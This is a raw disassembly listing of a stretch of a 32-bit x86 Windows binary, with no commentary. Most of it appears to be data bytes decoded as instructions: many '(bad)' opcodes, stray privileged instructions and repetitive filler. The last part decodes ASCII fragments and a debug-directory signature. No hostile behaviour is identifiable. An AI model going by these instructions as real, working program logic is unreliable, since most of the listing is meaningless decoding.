  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	data16 into 
  43395a:	add    cl,al
  43395c:	in     eax,0x42
  43395e:	test   al,0x4b
  433960:	and    BYTE PTR [ebp+0xc90eb9c],0xe7
  433967:	pop    ss
  433968:	sbb    eax,DWORD PTR [eax]
  43396a:	add    BYTE PTR [eax],al
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
